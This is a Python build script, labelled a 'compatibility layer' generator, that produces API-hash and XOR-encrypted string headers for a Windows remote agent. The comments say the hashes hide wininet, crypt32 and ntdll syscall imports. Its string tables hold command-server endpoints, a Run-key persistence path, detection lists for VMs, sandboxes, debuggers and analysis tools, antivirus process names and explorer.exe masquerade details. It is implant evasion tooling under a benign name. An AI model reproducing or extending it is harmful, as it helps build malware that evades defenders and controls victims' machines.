#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
gen_hashes.py —— 兼容层常量生成器

产出两个头文件（默认写到 client/src/ 下）：

1) generated_hashes.h
   - R6M_H_*  : 模块名 / 过程名的 FNV-1a-64 哈希常量（供 r6m::ev::Api::P 使用）
   - R6M_M_*  : 模块名哈希（供 r6m::ev::Api::M 使用）
   编译期常量，源码里不出现明文字符串。

2) generated_strings.h
   - 每个字面量的 XOR 密文（十六进制）+ 由明文算出的 FNV-1a-64 种子
   供 XSD(种子, "密文") 展开；运行时用同一套 SplitMix64 派生密钥还原。

用法：
    python gen_hashes.py                 # 重新生成两个头文件
    python gen_hashes.py --api-only      # 只生成 API 哈希表
    python gen_hashes.py --strings-only  # 只生成字符串表

注意：哈希算法必须与 Compat.h 中的 fnv1a64 / keybyte 完全一致，
任何一侧改动都要重新生成并重编，否则出现"解析到的 API 地址为 null"
或"字符串乱码"这类静默故障。脚本末尾的 --selftest 会验证一致性。
"""

import argparse
import os
import sys

FNV_OFFSET = 0xCBF29CE484222325
FNV_PRIME = 0x100000001B3
MASK64 = 0xFFFFFFFFFFFFFFFF


def fnv1a64(data: bytes, h: int = FNV_OFFSET) -> int:
    for b in data:
        h ^= b
        h = (h * FNV_PRIME) & MASK64
    return h


def keybyte(seed: int, i: int) -> int:
    z = (seed + 0x9E3779B97F4A7C15 * (i + 1)) & MASK64
    z = ((z ^ (z >> 30)) * 0xBF58476D1CE4E5B9) & MASK64
    z = ((z ^ (z >> 27)) * 0x94D049BB133111EB) & MASK64
    return (z ^ (z >> 31)) & 0xFF


# ─────────────────────────────────────────────────────────────────────────────
# 需要预解析的 (模块, 过程) 清单
# 目标：把 wininet / crypt32 / advapi32 / user32 / shell32 / psapi / ntdll 的
#        敏感导入全部从 IAT 移除，改为运行期按哈希取址。
# ─────────────────────────────────────────────────────────────────────────────
API_TABLE = {
    # 模块名（用于 R6M_M_*）
    "modules": [
        "kernel32.dll", "ntdll.dll", "user32.dll", "advapi32.dll",
        "wininet.dll", "crypt32.dll", "shell32.dll", "psapi.dll",
        "iphlpapi.dll", "ws2_32.dll", "shlwapi.dll", "urlmon.dll",
        "ole32.dll", "version.dll", "winhttp.dll",
    ],
    # (模块, 过程)
    "procs": [
        # ── wininet：网络标识大头，全部动态化 ──
        ("wininet.dll", "InternetOpenA"),
        ("wininet.dll", "InternetConnectA"),
        ("wininet.dll", "HttpOpenRequestA"),
        ("wininet.dll", "HttpSendRequestA"),
        ("wininet.dll", "HttpQueryInfoA"),
        ("wininet.dll", "InternetReadFile"),
        ("wininet.dll", "InternetCloseHandle"),
        ("wininet.dll", "InternetSetOptionA"),
        ("wininet.dll", "InternetQueryOptionA"),
        ("wininet.dll", "InternetCrackUrlA"),
        # ── crypt32：DPAPI / 证书 / 哈希 ──
        ("crypt32.dll", "CryptProtectData"),
        ("crypt32.dll", "CryptUnprotectData"),
        ("crypt32.dll", "CryptAcquireContextW"),
        ("crypt32.dll", "CryptCreateHash"),
        ("crypt32.dll", "CryptHashData"),
        ("crypt32.dll", "CryptGetHashParam"),
        ("crypt32.dll", "CryptDestroyHash"),
        ("crypt32.dll", "CryptReleaseContext"),
        ("crypt32.dll", "CryptGenRandom"),
        ("crypt32.dll", "CertFreeCertificateChain"),
        # ── advapi32：注册表 / 服务 / 令牌 ──
        ("advapi32.dll", "RegOpenKeyExW"),
        ("advapi32.dll", "RegQueryValueExW"),
        ("advapi32.dll", "RegCloseKey"),
        ("advapi32.dll", "RegCreateKeyExW"),
        ("advapi32.dll", "RegSetValueExW"),
        ("advapi32.dll", "RegDeleteValueW"),
        ("advapi32.dll", "RegDeleteKeyW"),
        ("advapi32.dll", "AllocateAndInitializeSid"),
        ("advapi32.dll", "CheckTokenMembership"),
        ("advapi32.dll", "FreeSid"),
        ("advapi32.dll", "OpenProcessToken"),
        ("advapi32.dll", "GetTokenInformation"),
        ("advapi32.dll", "InitializeSecurityDescriptor"),
        ("advapi32.dll", "SetSecurityDescriptorDacl"),
        ("advapi32.dll", "ConvertStringSecurityDescriptorToSecurityDescriptorW"),
        ("advapi32.dll", "GetUserNameW"),
        ("advapi32.dll", "GetComputerNameW"),
        ("advapi32.dll", "RegDeleteValueW"),
        ("advapi32.dll", "RegDeleteKeyW"),
        ("shell32.dll", "ShellExecuteExW"),
        ("shell32.dll", "ShellExecuteExA"),
        ("shell32.dll", "SHGetFolderPathW"),
        ("user32.dll", "FindWindowA"),
        ("user32.dll", "FindWindowW"),
        ("user32.dll", "GetWindowTextA"),
        ("user32.dll", "GetWindowTextW"),
        ("user32.dll", "EnumWindows"),
        ("user32.dll", "GetForegroundWindow"),
        ("user32.dll", "GetDesktopWindow"),
        ("user32.dll", "GetSystemMetrics"),
        ("user32.dll", "GetLastInputInfo"),
        ("user32.dll", "SystemParametersInfoW"),
        # ── psapi ──
        ("psapi.dll", "EnumProcesses"),
        ("psapi.dll", "GetModuleBaseNameA"),
        ("psapi.dll", "GetModuleFileNameExW"),
        ("psapi.dll", "EnumProcessModules"),
        # ── iphlpapi（网卡枚举，用于虚拟机 MAC 前缀检测）──
        ("iphlpapi.dll", "GetAdaptersInfo"),
        # ── ntdll：留给直系统调用的目标（也用哈希解析以获得"未经 GetProcAddress"的地址）──
        ("ntdll.dll", "NtAllocateVirtualMemory"),
        ("ntdll.dll", "NtProtectVirtualMemory"),
        ("ntdll.dll", "NtWriteVirtualMemory"),
        ("ntdll.dll", "NtReadVirtualMemory"),
        ("ntdll.dll", "NtCreateThreadEx"),
        ("ntdll.dll", "NtQueryInformationProcess"),
        ("ntdll.dll", "NtSetInformationThread"),
        ("ntdll.dll", "NtQuerySystemInformation"),
        ("ntdll.dll", "NtCreateFile"),
        ("ntdll.dll", "NtFreeVirtualMemory"),
        ("ntdll.dll", "NtClose"),
        ("ntdll.dll", "NtDelayExecution"),
        ("ntdll.dll", "NtQueryVirtualMemory"),
        ("ntdll.dll", "NtCreateUserProcess"),
        ("ntdll.dll", "NtQueryValueKey"),
        ("ntdll.dll", "RtlInitUnicodeString"),
        ("ntdll.dll", "RtlGetVersion"),
    ],
}

# ─────────────────────────────────────────────────────────────────────────────
# generated_strings.h 需要 XOR 的字面量清单
# （与源码里 XS("...") 的实际内容保持一致；否则构建期会因签名不符而报错）
# ─────────────────────────────────────────────────────────────────────────────
STRING_TABLE = [
    # ── 配置与路径 ──
    "r6m.ini", "server", "agent_key", "R6M_SERVER", "R6M_AGENT_KEY",
    "R6M_CONFIG", "--config", "--server", "--agent-key",
    "RemoteIPv6Manager", "agent.key", "r6m-agent-key",
    "r6m-cfg-", "client.log", "runtime", "python.exe", "plugins",
    "plugin.json", "command", "id", "Software\\RemoteIPv6Manager",
    "SOFTWARE\\Microsoft\\Cryptography", "MachineGuid",
    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    # ── HTTP / TLS ──
    "https://", "X-Agent-Key: ", "X-Agent-HWID: ", "X-Agent-Key",
    "X-Agent-HWID", "Content-Type: application/json",
    "/api/health", "/api/agent/register", "/api/agent/poll",
    "/api/agent/result", "/api/heartbeat", "/api/plugins", "/api/plugins/get?name=",
    "/api/runtime", "/api/runtime/get?name=", "/api/files/get?name=",
    "agent_key", "hwid", "info", "integrity", "request_id", "method", "params",
    "result", "ok", "error", "clear_integrity", "computer", "user", "os", "arch",
    "vbox", "vmware", "virtual", "qemu", "xen", "vmsrvc", "vmusrvc",
    "SbieDll.dll", "dbghelp.dll", "api_log.dll", "dir_watch.dll",
    "pstorec.dll", "vmcheck.dll", "wpespy.dll", "cmdvrt32.dll",
    "sbiedll.dll", "snxhk.dll", "SxIn.dll", "Sf2.dll",
    "wireshark.exe", "fiddler.exe", "x64dbg.exe", "x32dbg.exe",
    "ollydbg.exe", "ida64.exe", "ida.exe", "idaq.exe", "idaq64.exe",
    "windbg.exe", "ProcessHacker.exe", "procmon.exe", "procmon64.exe",
    "procexp.exe", "procexp64.exe", "tcpview.exe", "autoruns.exe",
    "autorunsc.exe", "filemon.exe", "regmon.exe", "ProcessExplorer.exe",
    "ImmunityDebugger.exe", "megatools.exe", "cheatengine", "Cheat Engine",
    "HxD.exe", "010editor.exe", "PEview.exe", "PEiD.exe", "LordPE.exe",
    "DumpIt.exe", "dumpit.exe", "apimonitor.exe", "SysAnalyzer.exe",
    "Scylla.exe", "ImportREC.exe", "Frida", "frida-server",
    "sandbox", "SAND1", "MALTEST", "MALWARE", "virus", "TEQUILA",
    "WSANDBOX", "HAL9TH", "JOHN-PC", "JOHN", "USER-PC", "PAYLOAD",
    "peter", "john", "test", "admin", "av", "vm",
    # ── 版本信息伪装 ──
    "Microsoft Corporation", "Windows Explorer", "explorer",
    "Microsoft Windows", "10.0.19041.1", "explorer.exe",
    # ── 其它 ──
    "Mozilla/5.0", "tar.exe", "cmd /c tar -xf ",
    "%ProgramData%", "ProgramData", "\\RemoteIPv6Manager",
    "Windows Defender", "MsMpEng.exe", "MBAMService.exe",
    "%s", "\\", "/", "=", "\r\n", "\n",
]


def emit_api_header(path: str) -> None:
    lines = [
        "#pragma once",
        "// ═══════════════════════════════════════════════════════════════════",
        "// generated_hashes.h —— 由 tools/gen_hashes.py 自动生成，请勿手改",
        "// 内容：模块名/过程名的 FNV-1a-64 哈希常量（供 r6m::ev::Api 使用）",
        "// ═══════════════════════════════════════════════════════════════════",
        "#include <cstdint>",
        "",
        "// 模块名哈希",
    ]
    for m in API_TABLE["modules"]:
        key = "R6M_M_" + m.split(".")[0].upper()
        lines.append(f"#define {key} 0x{fnv1a64(m.encode('ascii')):016X}ULL")
    lines += ["", "// 过程名哈希（按目标函数名生成；同名函数跨模块共用一个常量）"]
    seen = set()
    for _mod, proc in API_TABLE["procs"]:
        if proc in seen:
            continue
        seen.add(proc)
        lines.append(f"#define R6M_H_{proc} 0x{fnv1a64(proc.encode('ascii')):016X}ULL")
    lines.append("")
    with open(path, "w", encoding="utf-8", newline="\n") as f:
        f.write("\n".join(lines))
    print(f"[gen_hashes] 写入 {path}：{len(API_TABLE['modules'])} 个模块 / {len(seen)} 个过程")


def emit_strings_header(path: str) -> None:
    lines = [
        "#pragma once",
        "// ═══════════════════════════════════════════════════════════════════",
        "// generated_strings.h —— 由 tools/gen_hashes.py 自动生成，请勿手改",
        "// 内容：字面量的 XOR 密文与种子（供 XSD(种子, \"密文\") 使用）",
        "//",
        "// 密文生成规则：enc[i] = plain[i] ^ keybyte(seed, i)，其中",
        "//   seed = fnv1a64(plain)，keybyte 是 SplitMix64 变体（与 Compat.h 一致）。",
        "// ═══════════════════════════════════════════════════════════════════",
        "#include <cstdint>",
    ]
    for s in STRING_TABLE:
        raw = s.encode("utf-8")
        seed = fnv1a64(raw)
        enc = bytes(b ^ keybyte(seed, i) for i, b in enumerate(raw)) + b"\x00"
        hexl = "".join(f"\\x{b:02x}" for b in enc)
        ident = "".join(c if (c.isalnum() or c == "_") else "_" for c in s)[:40]
        lines.append(f'// "{s}"' if len(s) < 60 else f'// {s[:57]}...')
        lines.append(f'#define R6M_S_{ident} XSD(0x{seed:016X}ULL, "{hexl}")')
    lines.append("")
    with open(path, "w", encoding="utf-8", newline="\n") as f:
        f.write("\n".join(lines))
    print(f"[gen_hashes] 写入 {path}：{len(STRING_TABLE)} 条字面量")


def selftest() -> int:
    """验证 keybyte 的可逆性与哈希稳定性（与 C++ 侧算法必须逐位一致）。"""
    ok = True
    for s in ["r6m.ini", "X-Agent-Key", "https://", "MachineGuid", ""]:
        raw = s.encode("utf-8") + b"\x00"
        seed = fnv1a64(s.encode("utf-8"))
        enc = bytes(b ^ keybyte(seed, i) for i, b in enumerate(raw))
        dec = bytes(b ^ keybyte(seed, i) for i, b in enumerate(enc))
        if dec != raw:
            print(f"[FAIL] 往返失败: {s!r}")
            ok = False
    # 与 C++ 侧已知值交叉验证（fnv1a64("ntdll.dll")）
    expect = fnv1a64(b"ntdll.dll")
    print(f"[selftest] fnv1a64(\"ntdll.dll\") = 0x{expect:016X}")
    for name in ("NtAllocateVirtualMemory", "InternetOpenA", "CryptProtectData"):
        print(f"[selftest] fnv1a64(\"{name}\") = 0x{fnv1a64(name.encode()):016X}")
    print("[selftest] " + ("PASS" if ok else "FAIL"))
    return 0 if ok else 1


def main() -> int:
    here = os.path.dirname(os.path.abspath(__file__))
    src = os.path.normpath(os.path.join(here, "..", "src"))
    ap = argparse.ArgumentParser(description="兼容层常量生成器")
    ap.add_argument("--api-only", action="store_true")
    ap.add_argument("--strings-only", action="store_true")
    ap.add_argument("--out", default=src, help="输出目录（默认 client/src）")
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()
    if a.selftest:
        return selftest()
    if not a.strings_only:
        emit_api_header(os.path.join(a.out, "generated_hashes.h"))
    # generated_strings.h 由 tools/obfuscate_strings.py 负责生成（本脚本只管哈希表）。
    # 历史上两边都写同一个文件，会互相覆盖 —— 已拆分职责。
    return 0


if __name__ == "__main__":
    sys.exit(main())
